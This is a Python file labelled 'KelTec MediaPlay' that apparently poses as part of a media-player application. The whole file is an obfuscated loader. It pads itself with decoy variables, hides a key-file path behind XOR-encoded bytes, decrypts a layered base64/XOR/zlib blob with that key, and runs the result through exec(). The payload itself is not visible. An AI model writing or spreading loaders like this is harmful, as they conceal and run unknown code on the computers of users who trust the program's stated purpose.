# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 703511 ^ 479170
_lx1_1 = len("d9ad17")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-390031)
_lx3_3 = 991072 * 0
_lx4_4 = 769172 ^ 773927
_M = 'etrvykIMyV/V5PxY49VgusA178j3Wqe8r7xkcezA+3Yqjr2QW1+AAo7h/gzljGHmwGLnnvJd9Oir5mVx7cetcyaL4ZBcA9JV1+Wi'
_D = '==AySm97w3dkoYGgX9QVfztqJ1PayrogcZ59WiTuQOKHvU8GvXQYcya2C8orwgIt/IxS808Ne+vUl/8XOcKJ2mzKIpviGfThbM2jtareWHdzNNASSCFwSNTk8HSgy/un2xokRWyGuKQ9STqKiLOwoBRj3ThnIx0zHS0B/u9wd0JeNwRO6ER7Wu3g2hLZ7WaTSbdK6rq57ODFz3myGjulpqbfKjYC93S9zjHNvW+9V4JU0BeiCS5dRftlQzyYv51VDIvIiAMWIGO+fzJToPPZzjGeqJ8eE4+ccLz+cjWS9K8rEqQhxSypjBTMAAHV83Qfg93+7NO3tWOzefRryx3nyWl/GJOqLpIpAwE7dbdpwfhVRMukkY8fbOWbaQy9ZSuNoJYWtAHHVkGsSDfglwKlEmE0oIrIsnMt5ncPTLIoM6m//Ho+ugNrczr+sqeckNfmJVLaDjRu8cQy0L38GPIQIAA2ycdKwwcfNgvKx5Y/xs/LkjfY665+YIkxxxCPm2eRKbWHHppIcM5LKzevpYtoj1UZNP7HDBHpuodkla1cpkEDCpWOEwWATzSWu2lDRINCAyRL5ng/XNCZfBeWbSnAPigGcdlUUBBNqAuUZm3etCWCClyOL0mi9BFrGpD9yfWpFcM2CIEJtE5JxILcSTHrrKNKMPQQFxN1BY+DyqjH0FwmLwa5pf2rMjcrQ6x39rXV0QapfoP6vYeiPrcQKxvxTSFr3LOYF55dvM60fxf6sRz5VIAPcc+4KBLyBYdam33ewlrEirmEVQ4k1gqmuX0o7t1n4dGcxpeM3ZbBFuO/4adkJeDxvZyfrc5On6z5KEh6WJTdRT7Nsfl51GRv8aNK8Hn4fYG7bfHVVLLBSK3ViZBtmuS2LNwJjj0g8MiVyAWW/ehUkjKydNQjGRGleaIfkoKcT/6dQvhBClthO3VoxTUwUDCj1PSr+TTogrzGFVmvCk6hSzditkNZFSlEChcpn04k3UJV6UJek30Ay3CQjhiIh4hcf3Tgo92Uu+7wgYoB2wHpyuJQTUTpPV6q3NFlcJ7qWJ/88ugwuKR85Q231FcMWYL8/PtZhcAQXDWwyymj3DN5PgrA0GVvbtr++yQBJOfQFPjMX+tOs2eltZg/sWi60SZp/4k3vxGfxeQv8lzlvqfktfs+Am6G/0TEr/HvmvUNm1TfOcZcT5PsmIHHvQZKtrgYS42O2XC37RX6qiT3FAZO8GVmrXSz4kJoQx9nIDtz07uI0KrFPw9Rz6Z6SOcW/7jYAOctlu82SAU6yMKwxsLbYpNzl7KRdQcMI6TXzThm3M9xb/xhFvMzlObQVSD95+Cx1kp67hJHRidkIk2wo/Pj6ysfRSAthV4WQAOG24qqDOp+9ZoJJL76IkEhevWU+Yqv9h6ZKOqY/JJsbfg0VkLjlodgRIG7Hlvy3pYheMMTta14eaXg3GlJC6EeVJyp4jJ1KkfHzO2CTYfTu3SSfNChW8Z2yT7yywD4NBC083sLxdKai8X0kwNIvGL1Mped1WVxghiobnhlCJYdnws6VYvn'

_639c=[166,91,127,214,238,22,107,101]+[249,137,165,170,18,47,16,112]
_5ecd=[204,149,4,56,223,179,178,171]+[218,59,87,126,228,233,87,151]
_8c1c=bytes([a^b for a,b in zip([212,62,12,185,155,100,8,0,138,166,193,203,102,78],_639c*8)]).decode()
_5c4f=bytes([a^b for a,b in zip([191,240,112,76,182,221,213,216,244,89,62,16],_5ecd*8)]).decode()
_d2ee=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_8c1c.split('/'),_5c4f)
with open(_d2ee,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()